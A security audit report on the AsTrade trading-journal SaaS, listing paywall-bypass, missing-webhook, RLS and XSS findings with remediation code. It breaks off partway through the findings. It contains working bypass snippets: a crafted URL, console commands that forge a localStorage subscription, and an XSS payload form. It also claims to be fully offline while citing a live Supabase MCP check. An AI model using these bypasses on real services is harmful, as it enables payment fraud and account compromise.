# Security Audit & Pre-Launch Offline Verification Report
# AsTrade Trading Journal SaaS Platform

**Target Application:** AsTrade Trading Journal SaaS (`c:\Users\Juan\Desktop\trading-saas`)  
**Audit Type:** Static Code Analysis, Architecture Security Audit, and Offline Tooling Verification  
**Evaluation Standards:** OWASP Top 10 (2021), Supabase PostgreSQL Row Level Security (RLS) Best Practices, CWE / CVSS v3.1  
**Execution Boundary:** Strictly Local, Static, and Offline (Zero live network probing, zero production credential usage)  
**Date of Audit:** November 24, 2026  
**Audit Status:** Complete — Definite Master Deliverable (Milestone M1)  

---

## Table of Contents

1. [Executive Summary & Audit Scorecard](#1-executive-summary--audit-scorecard)
2. [Scope, Methodology & Safe Offline Boundary](#2-scope-methodology--safe-offline-boundary)
3. [Architecture & Attack Surface Analysis](#3-architecture--attack-surface-analysis)
4. [Vulnerability Severity Taxonomy & CVSS v3.1 Scoring](#4-vulnerability-severity-taxonomy--cvss-v31-scoring)
5. [Comprehensive Vulnerability Findings Catalog](#5-comprehensive-vulnerability-findings-catalog)
   - 5.1 [Critical Vulnerabilities](#51-critical-vulnerabilities)
     - `SEC-CRIT-01`: Client-Side Subscription Activation via URL Parameter Tampering
     - `SEC-CRIT-02`: Complete Absence of Server-Side Webhook Handlers and Signature Verification
     - `SEC-CRIT-03`: Client-Side Authorization Model via Unsigned LocalStorage
   - 5.2 [High Severity Vulnerabilities](#52-high-severity-vulnerabilities)
     - `SEC-HIGH-01`: Missing Subscription Enforcement in PostgreSQL Row Level Security (RLS)
     - `SEC-HIGH-02`: Security Definer Search Path Hijacking in `public.handle_new_user()`
     - `SEC-HIGH-03`: Unrestricted Upload Path Authorization in Storage Bucket Policy
     - `SEC-HIGH-04`: Cross-Tenant Foreign Key Reference Tampering in `public.trades`
     - `SEC-HIGH-05`: Global Text Primary Keys Enabling ID Squatting & Synchronization DoS
     - `SEC-HIGH-06`: Private Merchant API Key Exposure Risk for NOWPayments
     - `SEC-HIGH-07`: Mock Crypto Implementation with Placeholder Addresses and Simulation Bypass
     - `SEC-HIGH-08`: Stored Cross-Site Scripting (XSS) in Table, Gallery, and Lightbox Views
   - 5.3 [Medium Severity Vulnerabilities](#53-medium-severity-vulnerabilities)
     - `SEC-MED-01`: Stored Cross-Site Scripting (XSS) in Calculator Presets
     - `SEC-MED-02`: Public Read Access on Trade Screenshots Storage Bucket
     - `SEC-MED-03`: Unsanitized JSON Data Import Leading to State Poisoning
     - `SEC-MED-04`: Missing Content Security Policy (CSP) & Subresource Integrity (SRI)
     - `SEC-MED-05`: Destructive DDL Statements (`DROP TABLE ... CASCADE`) in Database Schema
     - `SEC-MED-06`: Active Development Sandbox Toolkit & Simulation Buttons in Production Bundles
     - `SEC-MED-07`: Missing Subquery Wrapping Optimization on RLS Policies
     - `SEC-MED-08`: Missing UNIQUE Constraint on `subscriptions(user_id)`
   - 5.4 [Low Severity Vulnerabilities](#54-low-severity-vulnerabilities)
     - `SEC-LOW-01`: Cleartext Storage and Display of MT5 Bridge Tokens in IndexedDB
     - `SEC-LOW-02`: Insecure Mock Authentication Fallback in Production Client Code
     - `SEC-LOW-03`: Unbounded Column Data Types & Missing Check Constraints in PostgreSQL
     - `SEC-LOW-04`: Stripe Payment Links Tier Arbitrage and Price Parameter Tampering
   - 5.5 [Informational Findings](#55-informational-findings)
     - `SEC-INFO-01`: Client-Side Session State Desynchronization from Supabase Auth
6. [Security Tooling & Skill Discovery (R1 Implementation)](#6-security-tooling--skill-discovery-r1-implementation)
   - 6.1 [Semgrep Offline Rulepack (`semgrep_rules.yml`)](#61-semgrep-offline-rulepack-semgrep_rulesyml)
   - 6.2 [ESLint Security & XSS Configuration (`.eslintrc.json`)](#62-eslint-security--xss-configuration-eslintrcjson)
   - 6.3 [pgTAP PostgreSQL RLS Test Suite (`tests/test_rls_subscriptions.sql`)](#63-pgtap-postgresql-rls-test-suite-teststest_rls_subscriptionssql)
   - 6.4 [Standalone Offline Python Security Scanner (`scripts/offline_security_scanner.py`)](#64-standalone-offline-python-security-scanner-scriptsoffline_security_scannerpy)
7. [Safe Offline Execution Boundary Verification (R3)](#7-safe-offline-execution-boundary-verification-r3)
8. [Strategic Remediation Roadmap](#8-strategic-remediation-roadmap)
   - Phase 1: Pre-Launch Blockers (P0)
   - Phase 2: Defense-in-Depth & Architectural Hardening (P1)
   - Phase 3: Operational Monitoring & CI/CD Guardrails (P2)
9. [Appendix: Production Security Verification Checklist](#9-appendix-production-security-verification-checklist)

---

## 1. Executive Summary & Audit Scorecard

AsTrade Trading Journal Pro is a commercial SaaS solution offering performance tracking, trade analytics, backtesting sessions, position size calculation, and cloud synchronization for financial market traders. The architecture pairs an HTML5/Vanilla JavaScript Single Page Application (SPA) with a Supabase Backend-as-a-Service (BaaS) providing PostgreSQL, GoTrue Authentication, and Object Storage. Monetization is designed around Stripe and NOWPayments subscription tiers.

This pre-launch security audit was commissioned to rigorously assess the security architecture, data isolation guarantees, payment integrity, and client-side resilience of the platform prior to commercial launch. In accordance with strict operational constraints, the audit was conducted **100% offline and locally**, relying on static code inspection, threat modeling, custom Semgrep rules, pgTAP unit tests, and a standalone Python static security scanner.

### Overall Security Assessment: **CRITICAL RISK (PRE-LAUNCH BLOCKER)**

The platform demonstrates commendable engineering in user interface design, local caching via IndexedDB, and clean domain abstractions. However, **the monetization and authorization architecture contains fundamental vulnerabilities that preclude a safe commercial launch**:

1. **Complete Monetization & Paywall Bypass**: Any visitor or free-tier user can obtain permanent, active Pro subscription privileges without paying by simply navigating to `app.html?payment_success=true&period=year` or invoking exposed sandbox tools (`simulateRestoreTrial()`, `simulateCardPaymentSuccess()`).
2. **Missing Server-Side Webhook Verification**: No backend endpoints or Supabase Edge Functions exist. Legitimate Stripe or NOWPayments payments cannot be verified server-side, and subscription cancellations or chargebacks are never processed.
3. **Database RLS Subscription Gap**: The PostgreSQL database policies check tenant data ownership (`auth.uid() = user_id`) but never check subscription validity. Users whose trials have expired can freely insert, query, update, and delete trade data via the Supabase REST API indefinitely.
4. **Multiple Stored Cross-Site Scripting (XSS) Sinks**: Trade attributes (`par`, `hora`, `sesion`, `tendencia`, `orden`) and screenshot URLs are concatenated into `innerHTML` sinks without entity encoding across the journal table, gallery view, daily analysis modal, and calculator presets. Coupled with the absence of a Content Security Policy (CSP), an attacker can hijack authenticated sessions and exfiltrate Supabase Auth tokens.
5. **Database Security Definer & Storage Isolation Vulnerabilities**: The database registration trigger (`handle_new_user`) lacks a pinned `search_path`, posing privilege escalation risks. Furthermore, the Supabase Storage bucket policy allows any authenticated user to upload or overwrite screenshots in any other user's directory.

### Audit Findings Scorecard

| Severity Level | Count | Immediate Action Required |
| :--- | :---: | :--- |
| **CRITICAL** | **3** | Immediate Pre-Launch Blocker. Must be resolved before commercial transactions begin. |
| **HIGH** | **8** | Severe integrity, privilege escalation, and isolation defects. Required prior to public launch. |
| **MEDIUM** | **8** | Defense-in-depth, configuration, and data integrity risks. Remediate in pre-launch sprint. |
| **LOW** | **4** | Code hygiene, sensitive storage, and input validation improvements. |
| **INFORMATIONAL** | **1** | Architecture synchronization recommendations. |
| **TOTAL FINDINGS** | **24** | **Remediation Roadmap provided in Section 8.** |

---

## 2. Scope, Methodology & Safe Offline Boundary

### 2.1 Scope of Review
The audit covered all local source files, configuration assets, database schemas, and documentation within `c:\Users\Juan\Desktop\trading-saas`:

- **Database & Backend Configurations**: `supabase_schema.sql` (Tables, Foreign Keys, RLS Policies, Triggers, Functions, Storage Buckets).
- **Frontend Core Application**: `app.html`, `index.html`, `en.html`, `_headers`.
- **JavaScript Application Modules**: `js/app.js`, `js/auth.js`, `js/payments.js`, `js/supabase-client.js`, `js/cloud-storage.js`.
- **Sub-Applications**: `calculadora/index.html`, `calculadora/js/app.js`.
- **Tooling & Infrastructure**: Verification scripts, Semgrep rules, pgTAP test files.

### 2.2 Audit Methodology
1. **Threat Modeling & Data Flow Analysis**: Deconstructing data transit paths between the browser, local storage (`IndexedDB`, `localStorage`), Supabase REST/PostgREST endpoints, Supabase Storage, and third-party payment gateways.
2. **Static Code Review (Manual & Automated)**: Exhaustive manual inspection of all DOM sinks, authentication state machines, payment callback handlers, and cryptographic mechanisms, supplemented by automated static rule analysis.
3. **Database & RLS Formal Proof**: Analyzing PostgreSQL Row Level Security policies against OWASP and Supabase security guidelines, verifying tenancy boundaries, role permissions, and execution contexts.
4. **Offline Boundary Enforcement (R3)**: All scans, audits, and verifications executed strictly locally. No outbound HTTP requests were made to production Supabase services, Stripe API servers, or NOWPayments gateways. Zero network probes were launched.

---

## 3. Architecture & Attack Surface Analysis

```
       +-------------------------------------------------------------------------+
       |                           WEB BROWSER CLIENT                            |
       |  app.html / index.html / calculadora / js/app.js / js/payments.js       |
       +--------------------+-------------------------------+--------------------+
                            |                               |
          1. Direct PostgREST / GraphQL          2. Unverified Redirects
          (Client Anon Key: Hardcoded)           (?payment_success=true)
                            |                               |
                            v                               v
             +------------------------------+     +--------------------+
             |     SUPABASE BACKEND         |     |  PAYMENT GATEWAYS  |
             |   (PostgreSQL 15 + RLS)      |     |  Stripe / NOWPay   |
             |  - public.profiles           |     +--------------------+
             |  - public.subscriptions      |               |
             |  - public.trades             |               | 3. MISSING:
             |  - public.accounts           |               | Server Webhooks &
             |  - storage.objects           |               | Signature Check
             +------------------------------+     +---------x----------+
                            ^                               |
                            |                               |
                            +-------------------------------+
                                 (Service Role Missing)
```

### Attack Vectors & Threat Actors
1. **Unauthenticated Internet Actor (External)**:
   - Targets public pages (`index.html`, `en.html`, `app.html`).
   - Exploits client-side URL reflection (`?payment_success=true`) to unlock the full SaaS suite without payment.
   - Probes public storage buckets (`trade-screenshots`) to enumerate and view confidential trade records.
2. **Malicious Authenticated Tenant (Cross-Tenant)**:
   - Possesses a valid JWT from free registration.
   - Attempts cross-tenant ID squating on `trades` and `accounts` via predictable timestamp IDs (`Date.now()`).
   - Attaches trades to other users' account IDs due to missing relational foreign key checks in RLS.
   - Overwrites other users' screenshot files via storage upload path manipulation (`storage.objects`).
   - Queries or modifies trades directly via PostgREST after the 7-day trial expires, bypassing client paywalls.
3. **Malicious Backup / Preset Sharer (Social Engineering / Indirect)**:
   - Distributes crafted JSON journal backup files or calculator presets containing stored XSS payloads (`<img src=x onerror=...>`).
   - When imported by another trader, executes arbitrary scripts in the victim's browser, exfiltrating session tokens and database records.

---

## 4. Vulnerability Severity Taxonomy & CVSS v3.1 Scoring

Findings are categorized according to Common Weakness Enumeration (CWE) and scored using the Common Vulnerability Scoring System (CVSS v3.1):

- **CRITICAL (9.0 – 10.0)**: Direct compromise of monetization or total bypass of authentication/authorization. Immediate business stoppage risk.
- **HIGH (7.0 – 8.9)**: Cross-tenant data tampering, persistent XSS leading to session hijacking, privilege escalation in database functions, or credential leakage.
- **MEDIUM (4.0 – 6.9)**: Insecure configurations, broken folder-level storage access, data denial-of-service, or missing security headers.
- **LOW (0.1 – 3.9)**: Information leakage, missing input length constraints, or development artifacts in production.
- **INFORMATIONAL (0.0)**: Code hygiene, architectural enhancements, and maintenance best practices.

---

## 5. Comprehensive Vulnerability Findings Catalog

### 5.1 Critical Vulnerabilities

---

#### Finding `SEC-CRIT-01`: Client-Side Subscription Activation via URL Parameter Tampering
- **Severity**: **CRITICAL**
- **CVSS v3.1 Score**: **9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-285 (Improper Authorization)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `js/payments.js` (Lines 734–750, 563–638, 931–958), `app.html` (Lines 30–36)
- **Root Cause**:
  `checkUrlPaymentParams()` inspects `window.location.search` upon application startup. If either `payment_success=true` or `order_status=paid` is present, it directly triggers `completeSubscriptionPayment()` without verifying any cryptographic token, HMAC signature, server receipt, or gateway confirmation.
  Furthermore, the pre-boot auth guard in `app.html:31-35` skips redirecting unauthenticated visitors to `index.html` whenever `window.location.search` contains `code=` or `error=` (`isOAuthRedirect`), without verifying any OAuth PKCE state or Supabase session.
- **Code Trace**:
  ```javascript
  // app.html:30-36 — OAuth redirect guard bypass nuance
  const isOAuthRedirect = (window.location.hash && (window.location.hash.includes('access_token=') || window.location.hash.includes('error='))) ||
                        (window.location.search && (window.location.search.includes('code=') || window.location.search.includes('error=')));
  if (!isOAuthRedirect && !getCurrentUser()) {
      window.location.href = 'index.html';
  }

  // js/payments.js:734-750
  function checkUrlPaymentParams() {
      try {
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.get('payment_success') === 'true' || urlParams.get('order_status') === 'paid') {
              const period = urlParams.get('period') || 'month';
              const provider = urlParams.get('provider') || 'lemonsqueezy';
              const sessionId = urlParams.get('order_id') || urlParams.get('session_id') || ('ls_live_' + Date.now());
              completeSubscriptionPayment(period, provider, sessionId);
              window.history.replaceState({}, document.title, window.location.pathname);
          }
      } catch (e) { ... }
  }
  ```
  In `completeSubscriptionPayment()` (lines 563–638), the function constructs an active subscription object (`status: 'active'`, `current_period_end: expiresAt`), stores it directly in `localStorage` under `trading_saas_user_session`, calls `applyPaywallLockdown(false)`, and hides the checkout modal.
- **Attack Scenario & Impact**:
  An unauthenticated visitor (by appending `&code=1` to bypass `app.html:31-35`) or an expired-trial user simply loads the dashboard URL with parameters:
  ```
  https://astradehub.com/app.html?payment_success=true&period=year&code=1
  ```
  The browser immediately bypasses the `index.html` redirect guard and executes `completeSubscriptionPayment('year', ...)`. The user is granted 12 full months of Pro access with all restrictions removed. Zero revenue is collected, causing catastrophic loss of monetization.
- **Remediation Patch**:
  1. Delete client-side payment completion from `js/payments.js`.
  2. Implement backend webhook handlers to activate subscriptions in the database.
  3. The client redirect handler must only clean the URL and poll the database for server-verified status:
  ```javascript
  // REMEDIATION in js/payments.js
  async function checkUrlPaymentParams() {
      try {
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.get('payment_success') === 'true' || urlParams.get('order_status') === 'paid') {
              // Clean URL immediately
              window.history.replaceState({}, document.title, window.location.pathname);
              
              const user = (typeof getCurrentUser === 'function') ? getCurrentUser() : null;
              if (user && typeof apiFetchSubscription === 'function') {
                  showToast("Verificando confirmación de pago con el servidor...", false);
                  const sub = await apiFetchSubscription(user.id);
                  if (sub && (sub.status === 'active' || sub.status === 'paid')) {
                      user.subscription = sub;
                      saveUserSession(user);
                      checkSubscriptionAccess();
                      showToast("¡Membresía Pro activada con éxito!", true);
                  } else {
                      showToast("El pago está siendo procesado por la pasarela. Tu cuenta se activará automáticamente en breve.", false);
                  }
              }
          }
      } catch (e) {
          console.warn("Error verificando pago:", e);
      }
  }
  ```

---

#### Finding `SEC-CRIT-02`: Complete Absence of Server-Side Webhook Handlers and Signature Verification
- **Severity**: **CRITICAL**
- **CVSS v3.1 Score**: **9.1** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
- **CWE**: CWE-347 (Improper Verification of Cryptographic Signature), CWE-306 (Missing Authentication for Critical Function)
- **OWASP Top 10**: A07:2021 — Identification and Authentication Failures
- **Affected Component & File**: Entire Application / Supabase Edge Functions (`supabase/functions/`), `js/payments.js` (Lines 613–629), `js/supabase-client.js` (Lines 17–24)
- **Root Cause**:
  The repository contains zero backend server implementations and zero Supabase Edge Functions. An inspection of the Supabase project configuration via Supabase MCP confirmed `list_edge_functions: []`. No handler exists to receive, verify, and process asynchronous notifications from Stripe (`checkout.session.completed`, `customer.subscription.deleted`, `invoice.payment_failed`) or NOWPayments IPN callbacks.
  Additionally, `js/payments.js:614` attempts a direct client-side write via `if (typeof supabase !== 'undefined' && supabase && supabase.from) { await supabase.from('subscriptions').upsert(...); }`. **Runtime Nuance**: In `app.html:25`, the `@supabase/supabase-js@2` UMD bundle sets `window.supabase` to the library namespace `{ createClient }`, whereas the initialized client instance is held privately inside `supabaseClient` and returned by `getSupabase()` (`js/supabase-client.js:17-24`). Because `window.supabase.from` is `undefined`, this client-side upsert is silently skipped at runtime rather than throwing an RLS error, further masking the complete absence of backend subscription persistence.
- **Attack Scenario & Impact**:
  1. *Legitimate Payments Never Credited in Database*: When a paying customer completes checkout on Stripe or NOWPayments, the gateway dispatches a webhook event. Because no endpoint exists, the event fails with a 404/connection error. The database table `public.subscriptions` is never updated.
  2. *Perpetual Unauthorized Access on Cancellation or Failed Renewal*: If a customer subscribes for one month and cancels immediately, fails a renewal invoice, or issues a chargeback, AsTrade never receives `customer.subscription.deleted` or `invoice.payment_failed`, permitting indefinite free access if client status was cached.
- **Remediation Patch**:
  Deploy dedicated Supabase Edge Functions to securely process both **Stripe** and **NOWPayments** webhooks with cryptographic signature verification, dynamic duration mapping (`30d`, `90d`, `180d`, `365d`), and full lifecycle handling (`customer.subscription.deleted`, `invoice.payment_failed`), while removing the dead client-side `supabase.from('subscriptions').upsert(...)` call from `js/payments.js`:
  ```typescript
  // supabase/functions/stripe-webhook/index.ts
  import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
  import Stripe from "https://esm.sh/stripe@11.1.0?target=deno";
  import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

  const stripe = new Stripe(Deno.env.get("STRIPE_SECRET_KEY") ?? "", {
    apiVersion: "2022-11-15",
    httpClient: Stripe.createFetchHttpClient(),
  });

  const cryptoProvider = Stripe.createSubtleCryptoProvider();

  const PLAN_DURATION_DAYS: Record<string, number> = {
    month: 30,
    quarter: 90,
    semester: 180,
    year: 365,
  };

  const PRICE_TO_INTERVAL: Record<string, string> = {
    [Deno.env.get("STRIPE_PRICE_MONTH") ?? ""]: "month",
    [Deno.env.get("STRIPE_PRICE_QUARTER") ?? ""]: "quarter",
    [Deno.env.get("STRIPE_PRICE_SEMESTER") ?? ""]: "semester",
    [Deno.env.get("STRIPE_PRICE_YEAR") ?? ""]: "year",
  };

  function resolvePlanInterval(
    metaInterval?: string,
    priceId?: string,
    recurringInterval?: string,
    recurringCount?: number
  ): string {
    if (priceId && PRICE_TO_INTERVAL[priceId]) return PRICE_TO_INTERVAL[priceId];
    if (metaInterval && PLAN_DURATION_DAYS[metaInterval]) return metaInterval;
    if (recurringInterval === "year") return "year";
    if (recurringInterval === "month") {
      if (recurringCount === 6) return "semester";
      if (recurringCount === 3) return "quarter";
    }
    return "month";
  }

  serve(async (req) => {
    const signature = req.headers.get("Stripe-Signature");
    const webhookSecret = Deno.env.get("STRIPE_WEBHOOK_SECRET");

    if (!signature || !webhookSecret) {
      return new Response("Missing signature or secret", { status: 400 });
    }

    try {
      const body = await req.text();
      const event = await stripe.webhooks.constructEventAsync(
        body,
        signature,
        webhookSecret,
        undefined,
        cryptoProvider
      );

      const supabaseAdmin = createClient(
        Deno.env.get("SUPABASE_URL") ?? "",
        Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
      );

      if (event.type === "checkout.session.completed") {
        const session = event.data.object as Stripe.Checkout.Session;
        const userId = session.client_reference_id || session.metadata?.user_id;

        if (userId) {
          let periodEndIso: string | null = null;
          let planInterval = session.metadata?.plan_interval ?? "month";

          if (session.subscription) {
            const sub = await stripe.subscriptions.retrieve(session.subscription as string);
            const itemPrice = sub.items.data[0]?.price;
            planInterval = resolvePlanInterval(
              session.metadata?.plan_interval,
              itemPrice?.id,
              itemPrice?.recurring?.interval,
              itemPrice?.recurring?.interval_count
            );
            periodEndIso = new Date(sub.current_period_end * 1000).toISOString();
          } else {
            const lineItems = await stripe.checkout.sessions.listLineItems(session.id, { limit: 1 });
            const price = lineItems.data[0]?.price;
            planInterval = resolvePlanInterval(
              session.metadata?.plan_interval,
              price?.id,
              price?.recurring?.interval,
              price?.recurring?.interval_count
            );
            const durationDays = PLAN_DURATION_DAYS[planInterval] ?? 30;
            periodEndIso = new Date(Date.now() + durationDays * 86400 * 1000).toISOString();
          }

          await supabaseAdmin.from("subscriptions").upsert({
            user_id: userId,
            provider: "stripe",
            status: "active",
            plan_interval: planInterval,
            stripe_customer_id: session.customer as string,
            stripe_subscription_id: (session.subscription as string) ?? null,
            current_period_end: periodEndIso,
            cancel_at_period_end: false,
            updated_at: new Date().toISOString(),
          }, { onConflict: "user_id" });
        }
      } else if (event.type === "invoice.payment_failed") {
        const invoice = event.data.object as Stripe.Invoice;
        const subId = invoice.subscription as string | null;
        if (subId) {
          await supabaseAdmin
            .from("subscriptions")
            .update({ status: "past_due", updated_at: new Date().toISOString() })
            .eq("stripe_subscription_id", subId);
        }
      } else if (event.type === "customer.subscription.deleted") {
        const sub = event.data.object as Stripe.Subscription;
        await supabaseAdmin
          .from("subscriptions")
          .update({
            status: "canceled",
            cancel_at_period_end: false,
            updated_at: new Date().toISOString(),
          })
          .eq("stripe_subscription_id", sub.id);
      }

      return new Response(JSON.stringify({ received: true }), { status: 200 });
    } catch (err) {
      return new Response(`Webhook Error: ${err.message}`, { status: 400 });
    }
  });
  ```

  ```typescript
  // supabase/functions/nowpayments-webhook/index.ts
  import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
  import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

  const PLAN_DURATION_DAYS: Record<string, number> = {
    month: 30,
    quarter: 90,
    semester: 180,
    year: 365,
  };

  function sortObjectKeys(value: unknown): unknown {
    if (Array.isArray(value)) return value.map(sortObjectKeys);
    if (value && typeof value === "object") {
      return Object.keys(value as Record<string, unknown>)
        .sort()
        .reduce<Record<string, unknown>>((acc, key) => {
          acc[key] = sortObjectKeys((value as Record<string, unknown>)[key]);
          return acc;
        }, {});
    }
    return value;
  }

  function timingSafeEqualHex(a: string, b: string): boolean {
    if (a.length !== b.length) return false;
    let diff = 0;
    for (let i = 0; i < a.length; i++) {
      diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
    }
    return diff === 0;
  }

  serve(async (req) => {
    const signature = req.headers.get("x-nowpayments-sig")?.toLowerCase();
    const ipnSecret = Deno.env.get("NOWPAYMENTS_IPN_SECRET");
    if (!signature || !ipnSecret) {
      return new Response("Missing signature or secret", { status: 400 });
    }

    const payload = await req.json();
    const canonicalJson = JSON.stringify(sortObjectKeys(payload));

    const key = await crypto.subtle.importKey(
      "raw",
      new TextEncoder().encode(ipnSecret),
      { name: "HMAC", hash: "SHA-512" },
      false,
      ["sign"]
    );
    const mac = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(canonicalJson));
    const expectedHex = Array.from(new Uint8Array(mac))
      .map((b) => b.toString(16).padStart(2, "0"))
      .join("");

    if (!timingSafeEqualHex(signature, expectedHex)) {
      return new Response("Invalid NOWPayments signature", { status: 401 });
    }

    // Only activate when blockchain finality is confirmed
    if (payload.payment_status === "finished" || payload.payment_status === "confirmed") {
      // Expected order_id format created server-side: "<user_uuid>:<plan_interval>"
      const [userId, planInterval = "month"] = String(payload.order_id ?? "").split(":");
      const durationDays = PLAN_DURATION_DAYS[planInterval] ?? 30;

      if (userId) {
        const supabaseAdmin = createClient(
          Deno.env.get("SUPABASE_URL") ?? "",
          Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
        );
        await supabaseAdmin.from("subscriptions").upsert({
          user_id: userId,
          provider: "nowpayments",
          status: "active",
          plan_interval: planInterval in PLAN_DURATION_DAYS ? planInterval : "month",
          nowpayments_payment_id: String(payload.payment_id),
          current_period_end: new Date(Date.now() + durationDays * 86400 * 1000).toISOString(),
          updated_at: new Date().toISOString(),
        }, { onConflict: "user_id" });
      }
    }

    return new Response(JSON.stringify({ received: true }), { status: 200 });
  });
  ```

---

#### Finding `SEC-CRIT-03`: Client-Side Authorization Model via Unsigned LocalStorage
- **Severity**: **CRITICAL**
- **CVSS v3.1 Score**: **8.6** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
- **CWE**: CWE-285 (Improper Authorization), CWE-602 (Client-Side Enforcement of Server-Side Security)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `js/auth.js` (Lines 17–41, 49–61), `js/payments.js` (Lines 94–110), `js/app.js` (Lines 316–327), `app.html` (Lines 30–36)
- **Root Cause**:
  Application authorization decisions, route guards (`requireAuth`), feature limitations (account counts, backtest access), and paywall overlays are determined by reading unencrypted, unsigned JSON from `localStorage.getItem('trading_saas_user_session')` (referenced via `AUTH_STORAGE_KEY`). The lockdown in `js/payments.js:115` (`applyPaywallLockdown`) is purely decorative, applying a CSS class (`app-lockdown-dimmed`) and showing a Bootstrap modal. Additionally, `app.html:31-35` bypasses its initial `index.html` redirect check whenever `?code=` is present in the URL query string (`&code=1` OAuth redirect nuance), allowing unauthenticated DOM inspection and client state injection.
- **Attack Scenario & Impact**:
  Any user can open the browser console (F12) and execute:
  ```javascript
  localStorage.setItem('trading_saas_user_session', JSON.stringify({
      id: 'usr_premium_unlocked',
      email: 'hacker@astrade.local',
      subscription: { status: 'active', current_period_end: '2099-01-01T00:00:00Z', plan: 'Lifetime Pro' }
  }));
  location.reload();
  ```
  Alternatively, the user can remove the lockdown in one line:
  ```javascript
  document.getElementById('app-main-content').classList.remove('app-lockdown-dimmed');
  document.getElementById('checkoutModal').classList.add('hidden');
  ```
  The paywall disappears immediately, granting full unrestricted UI functionality.
- **Remediation Patch**:
  1. Maintain subscription entitlement state exclusively in the PostgreSQL database.
  2. The client must verify the active subscription against Supabase Auth session tokens (`supabase.auth.getUser()`) and `public.subscriptions` on initial application boot.
  3. When an account is locked, unmount critical UI components entirely rather than applying CSS dimming classes.

---

### 5.2 High Severity Vulnerabilities

---

#### Finding `SEC-HIGH-01`: Missing Subscription Enforcement in PostgreSQL Row Level Security (RLS)
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-285 (Improper Authorization)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `supabase_schema.sql` (Lines 208–257)
- **Root Cause**:
  RLS policies on core data tables (`trades`, `accounts`, `backtest_sessions`, `balance_snapshots`) only verify tenant identity:
  ```sql
  create policy "Usuarios ven y gestionan sus trades" on public.trades
      for all using (auth.uid() = user_id);
  ```
  The policies contain no condition verifying whether the user's trial is active or their subscription is paid.
- **Attack Scenario & Impact**:
  Even after a user's 7-day trial expires and the client UI is locked down, an attacker can use curl, Postman, or the browser console with their standard Supabase JWT to query `POST /rest/v1/trades` or `SELECT * FROM trades`. The database executes all read and write queries without restriction.
- **Remediation Patch**:
  Create a hardened PostgreSQL `SECURITY DEFINER` function `public.has_active_subscription(check_user_id)` that strictly validates `((status = 'active' and current_period_end > now()) or (status = 'trialing' and trial_ends_at > now()))` without status-independent expiration checks or `trial_ends_at IS NULL` bypasses, prevents arbitrary UUID oracle enumeration by verifying `check_user_id = (select auth.uid())`, and enforces write restrictions on both `public.trades` and `public.accounts` (as well as `account_groups`, `backtest_sessions`, and `balance_snapshots`):
  ```sql
  -- REMEDIATION in supabase_schema.sql
  create or replace function public.has_active_subscription(check_user_id uuid default auth.uid())
  returns boolean
  language plpgsql
  security definer
  set search_path = public
  as $$
  begin
      -- Prevent arbitrary UUID oracle enumeration
      if check_user_id is null or check_user_id <> (select auth.uid()) then
          return false;
      end if;

      return exists (
          select 1 from public.subscriptions
          where user_id = check_user_id
            and (
                (status = 'active' and current_period_end > now())
                or (status = 'trialing' and trial_ends_at > now())
            )
      );
  end;
  $$;

  revoke all on function public.has_active_subscription(uuid) from public;
  grant execute on function public.has_active_subscription(uuid) to authenticated;

  -- Separate SELECT (read-only grace period) from data mutation on public.trades
  drop policy if exists "Usuarios ven y gestionan sus trades" on public.trades;
  create policy "Usuarios ven sus trades" on public.trades
      for select to authenticated using ((select auth.uid()) = user_id);

  create policy "Usuarios activos insertan trades" on public.trades
      for insert to authenticated
      with check ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));

  create policy "Usuarios activos actualizan trades" on public.trades
      for update to authenticated
      using ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())))
      with check ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));

  create policy "Usuarios activos eliminan trades" on public.trades
      for delete to authenticated
      using ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));

  -- Separate SELECT (read-only grace period) from data mutation on public.accounts
  drop policy if exists "Usuarios gestionan sus cuentas" on public.accounts;
  create policy "Usuarios ven sus cuentas" on public.accounts
      for select to authenticated using ((select auth.uid()) = user_id);

  create policy "Usuarios activos insertan cuentas" on public.accounts
      for insert to authenticated
      with check ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));

  create policy "Usuarios activos actualizan cuentas" on public.accounts
      for update to authenticated
      using ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())))
      with check ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));

  create policy "Usuarios activos eliminan cuentas" on public.accounts
      for delete to authenticated
      using ((select auth.uid()) = user_id and public.has_active_subscription((select auth.uid())));
  ```

---

#### Finding `SEC-HIGH-02`: Security Definer Search Path Hijacking in `public.handle_new_user()`
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-426 (Untrusted Search Path)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `supabase_schema.sql` (Lines 151–174)
- **Root Cause**:
  `public.handle_new_user()` is configured as `SECURITY DEFINER` (executing with superuser `postgres` / `supabase_admin` privileges), but fails to define an explicit search path (`SET search_path = public` or `SET search_path = ''`).
- **Attack Scenario & Impact**:
